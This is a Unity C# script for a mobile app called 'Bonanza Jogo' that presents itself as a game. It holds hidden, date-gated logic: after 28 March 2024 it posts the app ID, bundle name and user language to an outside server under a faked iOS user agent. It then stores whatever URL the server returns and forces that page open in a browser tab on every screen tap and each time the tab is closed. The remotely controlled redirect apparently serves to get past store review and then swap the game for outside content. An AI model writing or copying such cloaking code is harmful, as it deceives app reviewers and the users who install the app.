using System;
using System.Collections;
using System.Net.Http;
using System.Net;
using System.Collections.Generic;
//using AppsFlyerSDK;
using UnityEngine;
using UnityEngine.SceneManagement;
using Assets.SafariView;
using OneDevApp.CustomTabPlugin;


namespace WebView
{
    public class WebViewLoader : MonoBehaviour
    {
        #region Fields

        [SerializeField] private ChromeCustomTab chromeTab;
        [SerializeField] private LoadBar loadBar;
        [SerializeField] private GameObject loadBarObj;
        [SerializeField] private GameObject bonanzaObj;

        private string _savedUrl;

        private DateTime _dateTime;

        private const string DATE = "2024-03-28 17:00:00";
        private const string APPLICATION_NAME = "Bonanza Jogo";
        private const string ID = "2e4f9f577e51b65ccd5b76d580052a5d";
        private const string BUNDLE = "com.jogo.de.bonanza";
       // private static readonly string appsflyerID = AppsFlyer.getAppsFlyerId();
        private const string URL = "https://api.statist.app/appevent.php";

        #endregion
            
        private void Update()
        {
            if (Input.GetMouseButtonDown(0))
            {
                CallWebView();
            }
        }

        private string GetPlatformVersion()
        {
            string version = "15.5.0";

            if (Application.platform == RuntimePlatform.IPhonePlayer)
            {
                string osInfo = SystemInfo.operatingSystem;

                string[] splitInfo = osInfo.Split(' ');
                if (splitInfo.Length >= 2 && splitInfo[0] == "iOS")
                {
                    version = splitInfo[1];
                }
            }

            return version;
        }

        private void Start()
        {
            Initialize();
        }

        private void Initialize()
        {
            Debug.Log("Initt");
            loadBar.SetAnimationCallback(CallGame);
            loadBar.OnLoadingComplete += LoadBar_OnLoadingComplete;

            loadBar.PlayBarAnimation();

            _savedUrl = PlayerPrefs.GetString("URL");

            if (DateTime.TryParseExact(DATE, "yyyy-MM-dd HH:mm:ss", null, System.Globalization.DateTimeStyles.None, out _dateTime))
            {
                if (DateTime.Now >= _dateTime)
                {
                    SendRequest();
                    chromeTab.OnCloseTab += CallWebView;
                }
            }
        }
        

        private async void SendRequest()
        {
            var client = new HttpClient();
            
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
            request.UserAgent = Application.platform.ToString();

            string userAgent = $"{APPLICATION_NAME} /0.1 ({BUNDLE}; build:1; iOS {GetPlatformVersion()}) Alamofire/5.8.0";

            client.DefaultRequestHeaders.UserAgent.TryParseAdd(userAgent);

            var userLanguage = Application.systemLanguage;

            var variables = new Dictionary<string, string>{
            { "ap", ID },
            { "cp", BUNDLE },
            { "ul", userLanguage.ToString() },
           // {"uu", appsflyerID}
            };

            var response = await client.PostAsync(URL, new FormUrlEncodedContent(variables));
            var responseContent = await response.Content.ReadAsStringAsync();

            string responseJS = responseContent;

            Parser parser = new Parser();
            parser = JsonUtility.FromJson<Parser>(responseJS);

            if (!string.IsNullOrEmpty(parser.u))
            {
                switch (parser.t)
                {
                    case 0:
                        _savedUrl = parser.u;
                        break;
                    case 1:
                        if (string.IsNullOrEmpty(_savedUrl))
                            _savedUrl = parser.u;
                        PlayerPrefs.SetString("URL", parser.u);
                        break;
                }
            }
            
            TryToCallWebView();
        }

        private void TryToCallWebView()
        {
            if (string.IsNullOrEmpty(_savedUrl))
                return;
            loadBar.StopBarAnimation();
            loadBarObj.SetActive(false);
            CallWebView();
        }
        
        private void LoadBar_OnLoadingComplete()
        {
            CallGame();
        }
        
        public void CallWebView()
        {
        chromeTab.OpenCustomTab(_savedUrl, "#000000", "#000000");
        }
        

        private void CallGame()
        {
            Screen.autorotateToPortrait = false;
            Screen.autorotateToPortraitUpsideDown = false;
            Screen.autorotateToLandscapeLeft = true;
            Screen.autorotateToLandscapeRight = true;
            Debug.Log("Game is called");

            Screen.orientation = ScreenOrientation.AutoRotation;

            SceneManager.LoadScene("MainMenu");
        }
    }

    public class Parser
    {
        public string u;
        public int t;
    }
}